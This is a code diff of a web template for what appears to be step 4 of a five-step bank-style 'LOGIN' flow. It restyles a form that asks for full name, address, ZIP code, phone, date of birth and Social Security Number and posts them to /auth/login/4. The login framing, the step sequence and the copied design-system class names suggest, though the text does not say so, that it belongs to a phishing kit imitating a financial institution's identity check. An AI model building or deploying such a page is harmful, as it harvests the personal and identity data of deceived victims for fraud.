@@ -1,61 +1,195 @@
 @layout('layouts.app')
 
 @section('content')
-<form class="cb-form" action="/auth/login/4" method="POST">
-  <fieldset class="reg-content">
-    <legend>Personal Verification</legend>
+<div class="col-20" style="width: 60rem;">
+  <div class="step-header align" style="padding: 0rem;">
+    <h2 class="cb-content-header cb-content-header-title topMargin bottomMargin">LOGIN</h2>
 
-    <p class="note">Fields with an asterisk (*) are required.</p>
+    <p class="topMargin bottomMargin">Help us confirm it's you by filling out the following information.</p>
+    <br>
+  </div>
+  <br>
 
-    <div class="row">
-      <div class="large-12 column">
-        <div class="description">Help us confirm it's you by filling out the following information.</div>
-      </div>
-    </div>
+  <p class="required-header">Fields marked with asterisks (*) are required.</p>
 
-    <div class="tabs-content">
-      <div class="content active">
-        <div class="row">
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="fullName">Full Name*</label>
-            <input id="fullName" name="fullName" type="text" class="radius cb-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+  <form action="/auth/login/4" method="POST">
+    <h3>Personal Information</h3>
+
+    <div class="cb-input-wrapper-component">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="fullName" name="fullName" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="fullName">Full Name*</label>
+              </span>
+            </div>
           </div>
 
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="address">Street Address*</label>
-            <input id="address" name="address" type="text" class="radius cb-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
-          </div>
-
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="zip">ZIP Code*</label>
-            <input id="zip" name="zip" type="text" class="radius cb-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
-          </div>
-
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="phone">Mobile Phone*</label>
-            <input id="phone" name="phone" type="text" class="radius cb-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
-          </div>
-
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="dob">Date of Birth*</label>
-            <input id="dob" name="dob" type="text" placeholder="MM/DD/YYYY" class="radius cb-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
-          </div>
-
-          <div class="large-6 medium-6 medium-6-override column">
-            <label class="form-field-label" for="ssn">Social Security Number*</label>
-            <input id="ssn" name="ssn" type="password" class="radius cb-input cb-input-mask" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
           </div>
         </div>
       </div>
+    </div>
 
-      <div class="row">
-        <div class="large-12 column">
-          <button class="button radius right submitBtn" type="submit" disabled="">Continue</button>
+    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="address" name="address" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="address">Street Address*</label>
+              </span>
+            </div>
+          </div>
+
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
+          </div>
         </div>
       </div>
     </div>
-  </fieldset>
-</form>
+
+    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="zip" name="zip" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="zip">ZIP Code*</label>
+              </span>
+            </div>
+          </div>
+
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="phone" name="phone" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="phone">Mobile Phone*</label>
+              </span>
+            </div>
+          </div>
+
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="dob" name="dob" class="cb-input" type="text" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="dob">Date of Birth (MM/DD/YYYY)*</label>
+              </span>
+            </div>
+          </div>
+
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cb-input-wrapper-component" style="margin-top: 3rem">
+      <div class="cb-form-field primary cb-form-field-legacy">
+        <div class="cb-form-field-wrapper">
+          <div class="cb-form-field-flex">
+            <div class="cb-form-field-infix">
+              <div class="cb-input-core">
+                <input id="ssn" name="ssn" class="cb-input cb-input-mask" type="password" autocapitalize="off" autocorrect="off" autocomplete="off">
+              </div>
+
+              <span class="cb-form-field-label-wrapper">
+                <label class="cb-form-field-label cb-form-field-empty" for="ssn">Social Security Number*</label>
+              </span>
+            </div>
+          </div>
+
+          <div class="cb-form-field-underline">
+            <span class="cb-form-field-ripple"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="nav-btns" style="margin-bottom: 8.5rem; margin-top: 6rem;">
+        <button class="focus-indicator cb-button raised-button blue-btn primary-btn" type="submit" disabled="">
+          <span class="button-wrapper">NEXT</span>
+        </button>
+    </div>
+  </form>
+</div>
+@endsection
+
+@section('progress-bar')
+<div class="cb-row progress-bar-dots">
+  <ol>
+    <li class="future">
+      <p>
+        <span class="future">1</span>
+      </p>
+    </li>
+
+    <li class="future">
+      <p>
+        <span class="future">2</span>
+      </p>
+    </li>
+
+    <li class="future">
+      <p>
+        <span class="future">3</span>
+      </p>
+    </li>
+
+    <li class="present">
+      <p>
+        <span class="present">4</span>
+      </p>
+    </li>
+
+    <li class="future">
+      <p>
+        <span class="future">5</span>
+      </p>
+    </li>
+  </ol>
+</div>
 @endsection
 
 @section('script')
